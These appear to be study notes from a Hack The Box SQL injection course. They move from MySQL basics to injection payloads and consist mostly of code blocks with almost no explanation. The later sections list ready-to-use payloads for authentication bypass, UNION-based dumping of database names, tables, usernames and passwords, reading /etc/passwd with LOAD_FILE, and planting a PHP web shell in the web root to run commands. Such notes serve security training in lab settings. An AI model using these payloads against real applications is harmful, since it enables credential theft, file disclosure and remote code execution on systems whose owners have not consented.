# SQL Injection Fundamentals

**Introduction**

**SQL Injection (SQLi)**

**Use Cases and Impact**

**Prevention**
https://www.sqlinjection.net/stacked-queries/
https://www.mysqltutorial.org/mysql-basics/mysql-union/

# Intro to Databases

**Intro to Databases**

**Database Management Systems**

**Architecture**


# Types of Databases 

**Types of Databases**

**Relational Databases**

**Non-relational Databases**

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```


# Intro to MySQL 

**Structured Query Language (SQL)**

**Command Line**

```shell-session
mysql -u root -p
```

```
Enter password: <password>
```

```shell-session
mysql -u root -p<password>
```

```shell-session
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```
mysql -u root -h 83.136.253.132 -P 38038 -p

**Creating a Database**

```sql
CREATE DATABASE users;
```

```sql
SHOW DATABASES;
```

```sql
USE users;
```

**Tables**

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

```sql
SHOW TABLES;
```

```sql
DESCRIBE logins;
```

**Table Properties**

```sql
id INT NOT NULL AUTO_INCREMENT,
```

```sql
username VARCHAR(100) UNIQUE NOT NULL,
```

```sql
date_of_joining DATETIME DEFAULT NOW(),
```

```sql
PRIMARY KEY (id)
```

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```


# SQL Statements

**INSERT Statement**

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```

```shell-session
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

```shell-session
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

**SELECT Statement**

```sql
SELECT * FROM table_name;
```

```sql
SELECT column1, column2 FROM table_name;
```

```shell-session
mysql> SELECT * FROM logins;
```

```shell-session
mysql> SELECT username,password FROM logins;
```

**DROP Statement**

```shell-session
mysql> DROP TABLE logins;
```

```shell-session
mysql> SHOW TABLES;
```

**ALTER Statement**

```shell-session
mysql> ALTER TABLE logins ADD newColumn INT;
```

```shell-session
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```

```shell-session
mysql> ALTER TABLE logins MODIFY newerColumn DATE;
```

```shell-session
mysql> ALTER TABLE logins DROP newerColumn;
```

**UPDATE Statement**

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```shell-session
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
```

```shell-session
mysql> SELECT * FROM logins;
```


# Query Results 

**Sorting Results**

```sql
SELECT * FROM logins ORDER BY password;
```

```sql
SELECT * FROM logins ORDER BY password DESC;
```

```sql
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

**LIMIT Results**

```sql
SELECT * FROM logins LIMIT 2;
```

```sql
SELECT * FROM logins LIMIT 1, 2;
```

**WHERE Clause**

```sql
SELECT * FROM table_name WHERE <condition>;
```

```sql
SELECT * FROM logins WHERE id > 1;
```

```sql
SELECT * FROM logins WHERE username = 'admin';
```

**LIKE Clause**

```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

```sql
SELECT * FROM logins WHERE username LIKE '___';
```

```
SELECT last_name FROM employees  WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
```


# SQL Operators

**AND Operator**

```sql
condition1 AND condition2
```

```sql
SELECT 1 = 1 AND 'test' = 'test';
```

```sql
SELECT 1 = 1 AND 'test' = 'abc';
```

**OR Operator**

```sql
SELECT 1 = 1 OR 'test' = 'abc';
```

```sql
SELECT 1 = 2 OR 'test' = 'abc';
```

**NOT Operator**

```sql
SELECT NOT 1 = 1;
```

```sql
SELECT NOT 1 = 2;
```

**Symbol Operators**

```sql
SELECT 1 = 1 && 'test' = 'abc';
```

```sql
SELECT 1 = 1 || 'test' = 'abc';
```

```sql
SELECT 1 != 1;
```

**Operators in Queries**

```sql
SELECT * FROM logins WHERE username != 'john';
```

```sql
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

**Multiple Operator Precedence**

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

``` 
SELECT emp_no FROM titles WHERE title != '%engineer%' OR emp_no > 10000;

```

# Intro to SQL Injections 

**Use of SQL in Web Applications**

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

**SQL Injection**

```sql
select * from logins where username like '%$searchInput'
```

```php
'%1'; DROP TABLE users;'
```

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

**Syntax Errors**

```php
Error: near line 1: near "'": syntax error
```


# Subverting Query Logic

**Authentication Bypass**

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

**SQLi Discovery Payloads**

```
'
"
#
;
)
```

```
%27
%22
%23
%3B
%29
```

**SQL Error Example**

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

**OR Injection Payload**

```sql
admin' or '1'='1
```

**Injected Query**

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

**Password OR Injection**

```sql
something' or '1'='1
```

**Final Auth Bypass Payload**

```sql
' or '1'='1
```


# Using Comments 

**Comments**

```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

**Auth Bypass with Comments**

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

**Injected Username Payload**

```
admin'--
```

**Parenthesis Example (Original Query)**

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f';
```

**Failed Comment Injection (Unbalanced Parenthesis)**

```
admin'--
```

**Working Comment + Parenthesis Payload**

```
admin')--
```

**Final Resulting Query**

```sql
SELECT * FROM logins where (username='admin')
```

```
' OR id = 5)-- 
```

# Union Clause

**Union**

```sql
SELECT * FROM ports;
```

```sql
SELECT * FROM ships;
```

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

**Even Columns**

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

**Un-even Columns**

```sql
SELECT "junk" from passwords
```

```sql
SELECT 1 from passwords
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```

```sql
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```

```
SELECT COUNT(*) AS total

FROM (SELECT * FROM employees

UNION

SELECT dept_no, dept_name, NULL, NULL, NULL, NULL

FROM departments) AS u;
```

```
SELECT COUNT(*) 
FROM (
  SELECT emp_no FROM employees
  UNION
  SELECT dept_no FROM departments
) AS u;
```

admin')  UNION select 1, 2, database(),4 from INFORMATION_SCHEMA.SCHEMATA #
# Union Injection 

**SQLi Discovery**

```
'
```

**ORDER BY Column Enumeration**

```sql
' order by 1-- -
```

```sql
' order by 2-- -
```

```sql
' order by 3-- -
```

```sql
' order by 4-- -
```

```sql
' order by 5-- -
```

**UNION Column Enumeration**

```sql
cn' UNION select 1,2,3-- -
```

```sql
cn' UNION select 1,2,3,4-- -
```

**Visible Column Identification**

```sql
cn' UNION select 1,2,3,4-- -
```

**Database Version Test**

```sql
cn' UNION select 1,@@version,3,4-- -
```

**User Enumeration**

```sql
cn' UNION select 1,user(),3,4-- -
```


# Database Enumeration

**MySQL Fingerprinting**

```sql
SELECT @@version
```

```sql
SELECT POW(1,1)
```

```sql
SELECT SLEEP(5)
```

**INFORMATION_SCHEMA Database**

```sql
SELECT * FROM my_database.users;
```

**SCHEMATA**

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
cn' UNION select 1,database(),2,3-- -
```

**TABLES**

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='chattr'-- -
```

admin')  UNION select 1, 2, database(),4 from INFORMATION_SCHEMA.SCHEMATA #

admin') UNION select  1 , 2 ,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES  where  table_schema= 'chattr '#


```
admin') UNION select 1 , 2 ,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema= 'chattr' #
```


**COLUMNS**

```
admin' ) UNION SELECT 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='Users'-- -
```

**Data**

```sql
cn' UNION select 1, username, password, 4 from chattr.Users-- -
```

```
admin' )  UNION  select  1 ,  2 , password, username from chattr.Users  #
```

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -

cn' UNION select 1, username, password, 4 from ilfreight.users-- -
```
# Reading Files

**DB User**

```sql
SELECT USER()
```

```sql
SELECT CURRENT_USER()
```

```sql
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

**User Privileges**

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**LOAD_FILE**

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```


# Mitigate SQL Injection 

**CHECKING FILE WRITE CONFIGURATION**

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

---

**SELECT INTO OUTFILE — BASIC USAGE**

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```bash
cat /tmp/credentials
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```bash
cat /tmp/test.txt
```

```bash
ls -la /tmp/test.txt
```

---

**WRITING FILES THROUGH SQL INJECTION**

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

---

**WRITING A PHP WEB SHELL**

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

---

**EXECUTING COMMANDS VIA WEBSHELL**

```
/shell.php?0=id
```


#
#
#
#